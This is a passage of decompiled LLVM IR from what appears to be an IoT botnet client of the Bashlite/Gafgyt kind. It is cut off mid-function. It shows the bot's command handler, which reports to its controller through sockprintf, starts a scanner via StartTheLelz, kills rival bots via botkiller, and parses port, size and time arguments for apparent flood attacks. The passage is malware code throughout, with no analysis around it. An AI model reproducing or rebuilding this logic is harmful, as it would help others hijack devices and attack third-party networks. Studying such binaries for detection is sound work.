  br i1 %v1_804e9e8, label %dec_label_pc_804ea0c, label %dec_label_pc_804e9ea

dec_label_pc_804e9ea:                             ; preds = %dec_label_pc_804e9a3
  %v0_804e9ea = call i32 @getdtablesize()
  %v0_804e9ef = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804e9ef, i32* %edx.global-to-local, align 4
  %v0_804e9f5 = load i32, i32* @esp, align 4
  %v5_804e9f5 = icmp ult i32 %v0_804e9f5, 4
  store i1 %v5_804e9f5, i1* %cf.global-to-local, align 1
  store i32 %v0_804e9ef, i32* %stack_var_-380, align 4
  %v2_804e9ff = call i32 @sockprintf(i32 %v0_804e9ef, i32 ptrtoint ([3 x i8]* @global_var_8058f38.417 to i32))
  %v0_804ea04 = load i32, i32* @esp, align 4
  %v2_804ea04 = icmp ugt i32 %v0_804ea04, -17
  store i1 %v2_804ea04, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804ea0c:                             ; preds = %dec_label_pc_804e9a3
  %v2_804ea0f = load i32, i32* %v1_804e944, align 4
  %v4_804ea2c = inttoptr i32 %v2_804ea0f to i8*
  %v7_804ea3e = call i32 @_strncmp(i8* %v4_804ea2c, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058f3b.418, i32 0, i32 0), i32 8)
  %v8_804ea3e = urem i32 %v7_804ea3e, 2
  %v9_804ea3e = icmp eq i32 %v8_804ea3e, 0
  %v0_804ea40 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea40 = or i1 %v0_804ea40, %v9_804ea3e
  %v3_804ea40 = zext i1 %v2_804ea40 to i32
  %v4_804ea40 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea40 = and i32 %v4_804ea40, -256
  %v6_804ea40 = or i32 %v3_804ea40, %v5_804ea40
  %v7_804ea40 = xor i32 %v6_804ea40, 1
  store i32 %v7_804ea40, i32* %edx.global-to-local, align 4
  %v1_804ea48 = trunc i32 %v7_804ea40 to i8
  %v3_804ea48 = zext i1 %v0_804ea40 to i8
  %v15_804ea48 = icmp eq i8 %v1_804ea48, %v3_804ea48
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea51 = icmp eq i1 %v15_804ea48, false
  br i1 %v1_804ea51, label %dec_label_pc_804ebcb, label %dec_label_pc_804ea57

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804ea0c
  %v1_804ea5a = add i32 %tmp188, 4
  %v5_804ea5a = icmp ugt i32 %tmp188, -5
  store i1 %v5_804ea5a, i1* %cf.global-to-local, align 1
  %v1_804ea5d = inttoptr i32 %v1_804ea5a to i32*
  %v2_804ea5d = load i32, i32* %v1_804ea5d, align 4
  store i1 false, i1* @df, align 1
  %v4_804ea7a = inttoptr i32 %v2_804ea5d to i8*
  store i32 %v2_804ea5d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058f43.419 to i32), i32* @edi, align 4
  %v7_804ea8c = call i32 @_strncmp(i8* %v4_804ea7a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058f43.419, i32 0, i32 0), i32 4)
  %v8_804ea8c = urem i32 %v7_804ea8c, 2
  %v9_804ea8c = icmp eq i32 %v8_804ea8c, 0
  %v0_804ea8e = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea8e = or i1 %v0_804ea8e, %v9_804ea8c
  %v3_804ea8e = zext i1 %v2_804ea8e to i32
  %v4_804ea8e = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea8e = and i32 %v4_804ea8e, -256
  %v6_804ea8e = or i32 %v3_804ea8e, %v5_804ea8e
  %v7_804ea8e = xor i32 %v6_804ea8e, 1
  store i32 %v7_804ea8e, i32* @edx, align 4
  %v1_804ea96 = trunc i32 %v7_804ea8e to i8
  %v3_804ea96 = zext i1 %v0_804ea8e to i8
  %v15_804ea96 = icmp eq i8 %v1_804ea96, %v3_804ea96
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea9f = icmp eq i1 %v15_804ea96, false
  br i1 %v1_804ea9f, label %dec_label_pc_804eae1, label %dec_label_pc_804eaa1

dec_label_pc_804eaa1:                             ; preds = %dec_label_pc_804ea57
  %v0_804eaa1 = load i32, i32* @global_var_80617b0.420, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eaa6 = icmp eq i32 %v0_804eaa1, 0
  br i1 %v1_804eaa6, label %dec_label_pc_804f9cf, label %dec_label_pc_804eaae

dec_label_pc_804eaae:                             ; preds = %dec_label_pc_804eaa1
  %v0_804eab3 = load i32, i32* @esp, align 4
  %v5_804eab3 = icmp ult i32 %v0_804eab3, 8
  store i1 %v5_804eab3, i1* %cf.global-to-local, align 1
  store i32 %v0_804eaa1, i32* %stack_var_-380, align 4
  %v2_804eab9 = call i32 @kill(i32 %v0_804eaa1, i32 9)
  %v0_804eac1 = load i32, i32* @global_var_805b520.20, align 32
  %v5_804eac6 = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804eac6, i1* %cf.global-to-local, align 1
  store i32 %v0_804eac1, i32* %stack_var_-380, align 4
  %v2_804eacf = call i32 @sockprintf(i32 %v0_804eac1, i32 ptrtoint ([17 x i8]* @global_var_8058f47.421 to i32))
  %v0_804ead4 = load i32, i32* @esp, align 4
  %v2_804ead4 = icmp ugt i32 %v0_804ead4, -17
  store i1 %v2_804ead4, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_80617b0.420, align 16
  br label %dec_label_pc_804eae1

dec_label_pc_804eae1:                             ; preds = %dec_label_pc_804ea57, %dec_label_pc_804eaae
  store i1 %v5_804ea5a, i1* %cf.global-to-local, align 1
  %v2_804eae7 = load i32, i32* %v1_804ea5d, align 4
  store i1 false, i1* @df, align 1
  %v4_804eb04 = inttoptr i32 %v2_804eae7 to i8*
  store i32 %v2_804eae7, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8058f58.422 to i32), i32* @edi, align 4
  %v7_804eb16 = call i32 @_strncmp(i8* %v4_804eb04, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058f58.422, i32 0, i32 0), i32 3)
  %v8_804eb16 = urem i32 %v7_804eb16, 2
  %v9_804eb16 = icmp eq i32 %v8_804eb16, 0
  %v0_804eb18 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb18 = or i1 %v0_804eb18, %v9_804eb16
  %v3_804eb18 = zext i1 %v2_804eb18 to i32
  %v4_804eb18 = load i32, i32* @edx, align 4
  %v5_804eb18 = and i32 %v4_804eb18, -256
  %v6_804eb18 = or i32 %v3_804eb18, %v5_804eb18
  %v7_804eb18 = xor i32 %v6_804eb18, 1
  store i32 %v7_804eb18, i32* %edx.global-to-local, align 4
  %v1_804eb20 = trunc i32 %v7_804eb18 to i8
  %v3_804eb20 = zext i1 %v0_804eb18 to i8
  %v15_804eb20 = icmp eq i8 %v1_804eb20, %v3_804eb20
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb29 = icmp eq i1 %v15_804eb20, false
  br i1 %v1_804eb29, label %dec_label_pc_804ebcb, label %dec_label_pc_804eb2f

dec_label_pc_804eb2f:                             ; preds = %dec_label_pc_804eae1
  %v0_804eb2f = load i32, i32* @global_var_80617b0.420, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb34 = icmp eq i32 %v0_804eb2f, 0
  %v1_804eb36 = icmp eq i1 %v1_804eb34, false
  br i1 %v1_804eb36, label %dec_label_pc_804f9cf, label %dec_label_pc_804eb3c

dec_label_pc_804eb3c:                             ; preds = %dec_label_pc_804eb2f
  %v1_804eb3c = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804eb5b = icmp eq i32 %v1_804eb3c, 0
  br i1 %v4_804eb5b, label %dec_label_pc_804eb81, label %dec_label_pc_804eb64

dec_label_pc_804eb64:                             ; preds = %dec_label_pc_804eb3c
  store i32 %v1_804eb3c, i32* @global_var_80617b0.420, align 16
  br label %dec_label_pc_804f9cf

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb3c
  %v0_804eb81 = load i32, i32* @esp, align 4
  %v5_804eb81 = icmp ult i32 %v0_804eb81, 12
  store i1 %v5_804eb81, i1* %cf.global-to-local, align 1
  %v0_804eb84 = load i32, i32* @global_var_80617a8.240, align 8
  store i32 %v0_804eb84, i32* %stack_var_-380, align 4
  %v1_804eb8a = call i32 @__GI_inet_ntoa(i32 %v0_804eb84)
  %v0_804eb92 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804eb92, i32* %edx.global-to-local, align 4
  %v5_804eb98 = icmp ult i32* %stack_var_-364, inttoptr (i32 4 to i32*)
  store i1 %v5_804eb98, i1* %cf.global-to-local, align 1
  store i32 %v0_804eb92, i32* %stack_var_-380, align 4
  %v2_804eba2 = call i32 @sockprintf(i32 %v0_804eb92, i32 ptrtoint ([26 x i8]* @global_var_8058f5b.423 to i32))
  %v5_804ebaa = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804ebaa, i1* %cf.global-to-local, align 1
  store i32 10, i32* %stack_var_-380, align 4
  %v2_804ebb9 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804ebc1 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804ebc1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v1_804ebc6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ebcb:                             ; preds = %dec_label_pc_804eae1, %dec_label_pc_804ea0c
  %v2_804ebce = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804ebeb = inttoptr i32 %v2_804ebce to i8*
  store i32 %v2_804ebce, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8058f75.424 to i32), i32* @edi, align 4
  %v7_804ebfd = call i32 @_strncmp(i8* %v4_804ebeb, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058f75.424, i32 0, i32 0), i32 8)
  %v8_804ebfd = urem i32 %v7_804ebfd, 2
  %v9_804ebfd = icmp eq i32 %v8_804ebfd, 0
  %v0_804ebff = load i1, i1* %cf.global-to-local, align 1
  %v2_804ebff = or i1 %v0_804ebff, %v9_804ebfd
  %v3_804ebff = zext i1 %v2_804ebff to i32
  %v4_804ebff = load i32, i32* %edx.global-to-local, align 4
  %v5_804ebff = and i32 %v4_804ebff, -256
  %v6_804ebff = or i32 %v3_804ebff, %v5_804ebff
  %v7_804ebff = xor i32 %v6_804ebff, 1
  store i32 %v7_804ebff, i32* @edx, align 4
  %v1_804ec07 = trunc i32 %v7_804ebff to i8
  %v3_804ec07 = zext i1 %v0_804ebff to i8
  %v15_804ec07 = icmp eq i8 %v1_804ec07, %v3_804ec07
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec10 = icmp eq i1 %v15_804ec07, false
  br i1 %v1_804ec10, label %dec_label_pc_804ec53, label %dec_label_pc_804ec12

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804ebcb
  %v0_804ec12 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec17 = icmp eq i32 %v0_804ec12, 0
  %v1_804ec19 = icmp eq i1 %v1_804ec17, false
  br i1 %v1_804ec19, label %dec_label_pc_804ec53, label %dec_label_pc_804ec1b

dec_label_pc_804ec1b:                             ; preds = %dec_label_pc_804ec12
  %v0_804ec1b = load i32, i32* @esp, align 4
  %v5_804ec1b = icmp ult i32 %v0_804ec1b, 12
  store i1 %v5_804ec1b, i1* %cf.global-to-local, align 1
  %v0_804ec1e = load i32, i32* @global_var_80617a8.240, align 8
  store i32 %v0_804ec1e, i32* %stack_var_-396, align 4
  %v1_804ec24 = call i32 @__GI_inet_ntoa(i32 %v0_804ec1e)
  %v0_804ec2c = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804ec2c, i32* %edx.global-to-local, align 4
  %v5_804ec32 = icmp ult i32* %stack_var_-380, inttoptr (i32 4 to i32*)
  store i1 %v5_804ec32, i1* %cf.global-to-local, align 1
  store i32 %v0_804ec2c, i32* %stack_var_-396, align 4
  %v2_804ec3c = call i32 @sockprintf(i32 %v0_804ec2c, i32 ptrtoint ([29 x i8]* @global_var_8058f7d.425 to i32))
  %v0_804ec41 = load i32, i32* @esp, align 4
  %v2_804ec41 = icmp ugt i32 %v0_804ec41, -17
  store i1 %v2_804ec41, i1* %cf.global-to-local, align 1
  %v0_804ec44 = call i32 @botkiller()
  %v0_804ec49 = load i32, i32* @esp, align 4
  %v5_804ec49 = icmp ult i32 %v0_804ec49, 12
  store i1 %v5_804ec49, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804ec4e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ec53:                             ; preds = %dec_label_pc_804ec12, %dec_label_pc_804ebcb
  %v2_804ec56 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804ec73 = inttoptr i32 %v2_804ec56 to i8*
  store i32 %v2_804ec56, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_8058f9a.426 to i32), i32* @edi, align 4
  %v7_804ec85 = call i32 @_strncmp(i8* %v4_804ec73, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058f9a.426, i32 0, i32 0), i32 12)
  %v8_804ec85 = urem i32 %v7_804ec85, 2
  %v9_804ec85 = icmp eq i32 %v8_804ec85, 0
  %v0_804ec87 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ec87 = or i1 %v0_804ec87, %v9_804ec85
  %v3_804ec87 = zext i1 %v2_804ec87 to i32
  %v4_804ec87 = load i32, i32* @edx, align 4
  %v5_804ec87 = and i32 %v4_804ec87, -256
  %v6_804ec87 = or i32 %v3_804ec87, %v5_804ec87
  %v7_804ec87 = xor i32 %v6_804ec87, 1
  store i32 %v7_804ec87, i32* %edx.global-to-local, align 4
  %v1_804ec8f = trunc i32 %v7_804ec87 to i8
  %v3_804ec8f = zext i1 %v0_804ec87 to i8
  %v15_804ec8f = icmp eq i8 %v1_804ec8f, %v3_804ec8f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec98 = icmp eq i1 %v15_804ec8f, false
  br i1 %v1_804ec98, label %dec_label_pc_804ecc8, label %dec_label_pc_804ec9a

dec_label_pc_804ec9a:                             ; preds = %dec_label_pc_804ec53
  %v0_804ec9a = load i32, i32* @esp, align 4
  %v5_804ec9a = icmp ult i32 %v0_804ec9a, 12
  store i1 %v5_804ec9a, i1* %cf.global-to-local, align 1
  %v0_804ec9d = load i32, i32* @global_var_80617a8.240, align 8
  store i32 %v0_804ec9d, i32* %stack_var_-380, align 4
  %v1_804eca3 = call i32 @__GI_inet_ntoa(i32 %v0_804ec9d)
  %v0_804ecab = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804ecab, i32* %edx.global-to-local, align 4
  %v5_804ecb1 = icmp ult i32* %stack_var_-364, inttoptr (i32 4 to i32*)
  store i1 %v5_804ecb1, i1* %cf.global-to-local, align 1
  store i32 %v0_804ecab, i32* %stack_var_-380, align 4
  %v2_804ecbb = call i32 @sockprintf(i32 %v0_804ecab, i32 ptrtoint ([17 x i8]* @global_var_8058fa6.427 to i32))
  %v0_804ecc0 = load i32, i32* @esp, align 4
  %v2_804ecc0 = icmp ugt i32 %v0_804ecc0, -17
  store i1 %v2_804ecc0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804ecc8:                             ; preds = %dec_label_pc_804ec53
  %v2_804eccb = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804ece8 = inttoptr i32 %v2_804eccb to i8*
  store i32 %v2_804eccb, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058fb7.428 to i32), i32* @edi, align 4
  %v7_804ecfa = call i32 @_strncmp(i8* %v4_804ece8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058fb7.428, i32 0, i32 0), i32 4)
  %v8_804ecfa = urem i32 %v7_804ecfa, 2
  %v9_804ecfa = icmp eq i32 %v8_804ecfa, 0
  %v0_804ecfc = load i1, i1* %cf.global-to-local, align 1
  %v2_804ecfc = or i1 %v0_804ecfc, %v9_804ecfa
  %v3_804ecfc = zext i1 %v2_804ecfc to i32
  %v4_804ecfc = load i32, i32* %edx.global-to-local, align 4
  %v5_804ecfc = and i32 %v4_804ecfc, -256
  %v6_804ecfc = or i32 %v3_804ecfc, %v5_804ecfc
  %v7_804ecfc = xor i32 %v6_804ecfc, 1
  store i32 %v7_804ecfc, i32* %edx.global-to-local, align 4
  %v1_804ed04 = trunc i32 %v7_804ecfc to i8
  %v3_804ed04 = zext i1 %v0_804ecfc to i8
  %v15_804ed04 = icmp eq i8 %v1_804ed04, %v3_804ed04
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed0d = icmp eq i1 %v15_804ed04, false
  br i1 %v1_804ed0d, label %dec_label_pc_804efd3, label %dec_label_pc_804ed13

dec_label_pc_804ed13:                             ; preds = %dec_label_pc_804ecc8
  %v9_804ed13 = icmp ult i32 %tmp160, 5
  store i1 %v9_804ed13, i1* %cf.global-to-local, align 1
  %v7_804ed17 = icmp sgt i32 %tmp160, 5
  br i1 %v7_804ed17, label %dec_label_pc_804ed1d, label %dec_label_pc_804ed13.dec_label_pc_804edfa_crit_edge

dec_label_pc_804ed13.dec_label_pc_804edfa_crit_edge: ; preds = %dec_label_pc_804ed13
  %v0_804edff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804edfa

dec_label_pc_804ed1d:                             ; preds = %dec_label_pc_804ed13
  %v1_804ed20 = add i32 %tmp188, 12
  %v1_804ed23 = inttoptr i32 %v1_804ed20 to i32*
  %v2_804ed23 = load i32, i32* %v1_804ed23, align 4
  %v0_804ed25 = load i32, i32* @esp, align 4
  %v5_804ed25 = icmp ult i32 %v0_804ed25, 12
  store i1 %v5_804ed25, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed23, i32* %stack_var_-380, align 4
  %v1_804ed29 = call i32 @atol(i32 %v2_804ed23)
  %v5_804ed31 = icmp ne i32 %v1_804ed29, -1
  store i1 %v5_804ed31, i1* %cf.global-to-local, align 1
  %v10_804ed31 = icmp eq i32 %v1_804ed29, -1
  br i1 %v10_804ed31, label %dec_label_pc_804edfa, label %dec_label_pc_804ed3a

dec_label_pc_804ed3a:                             ; preds = %dec_label_pc_804ed1d
  %v1_804ed3d = add i32 %tmp188, 8
  %v1_804ed40 = inttoptr i32 %v1_804ed3d to i32*
  %v2_804ed40 = load i32, i32* %v1_804ed40, align 4
  %v5_804ed42 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed40, i32* %stack_var_-380, align 4
  %v1_804ed46 = call i32 @atol(i32 %v2_804ed40)
  %v5_804ed4e = icmp ne i32 %v1_804ed46, -1
  store i1 %v5_804ed4e, i1* %cf.global-to-local, align 1
  %v10_804ed4e = icmp eq i32 %v1_804ed46, -1
  br i1 %v10_804ed4e, label %dec_label_pc_804edfa, label %dec_label_pc_804ed57

dec_label_pc_804ed57:                             ; preds = %dec_label_pc_804ed3a
  %v1_804ed5a = add i32 %tmp188, 16
  %v1_804ed5d = inttoptr i32 %v1_804ed5a to i32*
  %v2_804ed5d = load i32, i32* %v1_804ed5d, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed5d, i32* %stack_var_-380, align 4
  %v1_804ed63 = call i32 @atol(i32 %v2_804ed5d)
  %v5_804ed6b = icmp ne i32 %v1_804ed63, -1
  store i1 %v5_804ed6b, i1* %cf.global-to-local, align 1
  %v10_804ed6b = icmp eq i32 %v1_804ed63, -1
  br i1 %v10_804ed6b, label %dec_label_pc_804edfa, label %dec_label_pc_804ed74

dec_label_pc_804ed74:                             ; preds = %dec_label_pc_804ed57
  %v1_804ed77 = add i32 %tmp188, 20
  %v1_804ed7a = inttoptr i32 %v1_804ed77 to i32*
  %v2_804ed7a = load i32, i32* %v1_804ed7a, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed7a, i32* %stack_var_-380, align 4
  %v1_804ed80 = call i32 @atol(i32 %v2_804ed7a)
  %v5_804ed88 = icmp ne i32 %v1_804ed80, -1
  store i1 %v5_804ed88, i1* %cf.global-to-local, align 1
  %v10_804ed88 = icmp eq i32 %v1_804ed80, -1
  br i1 %v10_804ed88, label %dec_label_pc_804edfa, label %dec_label_pc_804ed8d

dec_label_pc_804ed8d:                             ; preds = %dec_label_pc_804ed74
  %v2_804ed93 = load i32, i32* %v1_804ed7a, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ed93, i32* %stack_var_-380, align 4
  %v1_804ed99 = call i32 @atol(i32 %v2_804ed93)
  %v1_804eda1 = add i32 %v1_804ed99, -65536
  %v2_804eda1 = icmp ult i32 %v1_804ed99, 65536
  %v3_804eda1 = sub i32 65535, %v1_804ed99
  %v4_804eda1 = and i32 %v3_804eda1, %v1_804ed99
  %v5_804eda1 = icmp slt i32 %v4_804eda1, 0
  store i1 %v2_804eda1, i1* %cf.global-to-local, align 1
  %v6_804eda1 = icmp eq i32 %v1_804eda1, 0
  %v7_804eda1 = icmp slt i32 %v1_804eda1, 0
  %v3_804eda6 = icmp eq i1 %v7_804eda1, %v5_804eda1
  %v4_804eda6 = icmp eq i1 %v6_804eda1, false
  %v5_804eda6 = and i1 %v4_804eda6, %v3_804eda6
  br i1 %v5_804eda6, label %dec_label_pc_804edfa, label %dec_label_pc_804eda8

dec_label_pc_804eda8:                             ; preds = %dec_label_pc_804ed8d
  %v2_804edae = load i32, i32* %v1_804ed7a, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804edae, i32* %stack_var_-380, align 4
  %v1_804edb4 = call i32 @atol(i32 %v2_804edae)
  %v1_804edbc = add i32 %v1_804edb4, -65500
  %v5_804edbc = icmp ult i32 %v1_804edb4, 65500
  %v6_804edbc = sub i32 65499, %v1_804edb4
  %v7_804edbc = and i32 %v6_804edbc, %v1_804edb4
  %v8_804edbc = icmp slt i32 %v7_804edbc, 0
  store i1 %v5_804edbc, i1* %cf.global-to-local, align 1
  %v9_804edbc = icmp eq i32 %v1_804edbc, 0
  %v10_804edbc = icmp slt i32 %v1_804edbc, 0
  %v3_804edc1 = icmp eq i1 %v10_804edbc, %v8_804edbc
  %v4_804edc1 = icmp eq i1 %v9_804edbc, false
  %v5_804edc1 = and i1 %v4_804edc1, %v3_804edc1
  br i1 %v5_804edc1, label %dec_label_pc_804edfa, label %dec_label_pc_804edc3

dec_label_pc_804edc3:                             ; preds = %dec_label_pc_804eda8
  %v2_804edc9 = load i32, i32* %v1_804ed5d, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804edc9, i32* %stack_var_-380, align 4
  %v1_804edcf = call i32 @atol(i32 %v2_804edc9)
  %v1_804edd7 = add i32 %v1_804edcf, -32
  %v2_804edd7 = icmp ult i32 %v1_804edcf, 32
  %v3_804edd7 = sub i32 31, %v1_804edcf
  %v4_804edd7 = and i32 %v3_804edd7, %v1_804edcf
  %v5_804edd7 = icmp slt i32 %v4_804edd7, 0
  store i1 %v2_804edd7, i1* %cf.global-to-local, align 1
  %v6_804edd7 = icmp eq i32 %v1_804edd7, 0
  %v7_804edd7 = icmp slt i32 %v1_804edd7, 0
  %v3_804edda = icmp eq i1 %v7_804edd7, %v5_804edd7
  %v4_804edda = icmp eq i1 %v6_804edd7, false
  %v5_804edda = and i1 %v4_804edda, %v3_804edda
  br i1 %v5_804edda, label %dec_label_pc_804edfa, label %dec_label_pc_804eddc

dec_label_pc_804eddc:                             ; preds = %dec_label_pc_804edc3
  %v8_804eddc = icmp ult i32 %tmp160, 7
  store i1 %v8_804eddc, i1* %cf.global-to-local, align 1
  %v12_804eddc = icmp eq i32 %tmp160, 7
  %v1_804ede0 = icmp eq i1 %v12_804eddc, false
  br i1 %v1_804ede0, label %dec_label_pc_804ee15, label %dec_label_pc_804ede2

dec_label_pc_804ede2:                             ; preds = %dec_label_pc_804eddc
  %v1_804ede5 = add i32 %tmp188, 24
  %v1_804ede8 = inttoptr i32 %v1_804ede5 to i32*
  %v2_804ede8 = load i32, i32* %v1_804ede8, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ede8, i32* %stack_var_-380, align 4
  %v1_804edee = call i32 @atol(i32 %v2_804ede8)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp211 = icmp slt i32 %v1_804edee, 1
  %tmp212 = icmp eq i1 %tmp211, false
  br i1 %tmp212, label %dec_label_pc_804ee15, label %dec_label_pc_804edfa

dec_label_pc_804edfa:                             ; preds = %dec_label_pc_804ed13.dec_label_pc_804edfa_crit_edge, %dec_label_pc_804ede2, %dec_label_pc_804edc3, %dec_label_pc_804eda8, %dec_label_pc_804ed8d, %dec_label_pc_804ed74, %dec_label_pc_804ed57, %dec_label_pc_804ed3a, %dec_label_pc_804ed1d
  %v0_804edff = phi i32 [ %v0_804edff.pre, %dec_label_pc_804ed13.dec_label_pc_804edfa_crit_edge ], [ %v15_804e93b, %dec_label_pc_804ede2 ], [ %v15_804e93b, %dec_label_pc_804edc3 ], [ %v15_804e93b, %dec_label_pc_804eda8 ], [ %v15_804e93b, %dec_label_pc_804ed8d ], [ %v15_804e93b, %dec_label_pc_804ed74 ], [ %v15_804e93b, %dec_label_pc_804ed57 ], [ %v15_804e93b, %dec_label_pc_804ed3a ], [ %v15_804e93b, %dec_label_pc_804ed1d ]
  %v0_804edfa = load i32, i32* @global_var_805b520.20, align 32
  %v5_804edff = icmp ult i32 %v0_804edff, 8
  store i1 %v5_804edff, i1* %cf.global-to-local, align 1
  store i32 %v0_804edfa, i32* %stack_var_-380, align 4
  %v2_804ee08 = call i32 @sockprintf(i32 %v0_804edfa, i32 ptrtoint ([113 x i8]* @global_var_8058fbc.429 to i32))
  %v0_804ee0d = load i32, i32* @esp, align 4
  %v2_804ee0d = icmp ugt i32 %v0_804ee0d, -17
  store i1 %v2_804ee0d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804ee15:                             ; preds = %dec_label_pc_804ede2, %dec_label_pc_804eddc
  %v1_804ee18 = add i32 %tmp188, 4
  %v1_804ee1b = inttoptr i32 %v1_804ee18 to i32*
  %v2_804ee1b = load i32, i32* %v1_804ee1b, align 4
  %v2_804ee26 = load i32, i32* %v1_804ed40, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee26, i32* %stack_var_-380, align 4
  %v1_804ee2c = call i32 @atol(i32 %v2_804ee26)
  %v2_804ee3d = load i32, i32* %v1_804ed23, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee3d, i32* %stack_var_-380, align 4
  %v1_804ee43 = call i32 @atol(i32 %v2_804ee3d)
  %v2_804ee54 = load i32, i32* %v1_804ed5d, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee54, i32* %stack_var_-380, align 4
  %v1_804ee5a = call i32 @atol(i32 %v2_804ee54)
  %v2_804ee6b = load i32, i32* %v1_804ed7a, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee6b, i32* %stack_var_-380, align 4
  %v1_804ee71 = call i32 @atol(i32 %v2_804ee6b)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ee80 = icmp sgt i32 %tmp160, 6
  br i1 %v7_804ee80, label %dec_label_pc_804eea8, label %dec_label_pc_804eea8.thread

dec_label_pc_804eea8.thread:                      ; preds = %dec_label_pc_804ee15
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804eddc, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eedd.thread

dec_label_pc_804eea8:                             ; preds = %dec_label_pc_804ee15
  %v1_804ee85 = add i32 %tmp188, 24
  %v1_804ee88 = inttoptr i32 %v1_804ee85 to i32*
  %v2_804ee88 = load i32, i32* %v1_804ee88, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee88, i32* %stack_var_-380, align 4
  %v1_804ee8e = call i32 @atol(i32 %v2_804ee88)
  store i32 %v1_804ee8e, i32* @esi, align 4
  store i1 %v8_804eddc, i1* %cf.global-to-local, align 1
  br i1 %v12_804eddc, label %dec_label_pc_804eedd.thread, label %dec_label_pc_804eedd

dec_label_pc_804eedd.thread:                      ; preds = %dec_label_pc_804eea8, %dec_label_pc_804eea8.thread
  %storemerge39226.ph = phi i32 [ 1000, %dec_label_pc_804eea8.thread ], [ %v1_804ee8e, %dec_label_pc_804eea8 ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ef12

dec_label_pc_804eedd:                             ; preds = %dec_label_pc_804eea8
  %v1_804eeba = add i32 %tmp188, 28
  %v1_804eebd = inttoptr i32 %v1_804eeba to i32*
  %v2_804eebd = load i32, i32* %v1_804eebd, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804eebd, i32* %stack_var_-380, align 4
  %v1_804eec3 = call i32 @atol(i32 %v2_804eebd)
  store i32 %v1_804eec3, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eeea = icmp sgt i32 %tmp160, 8
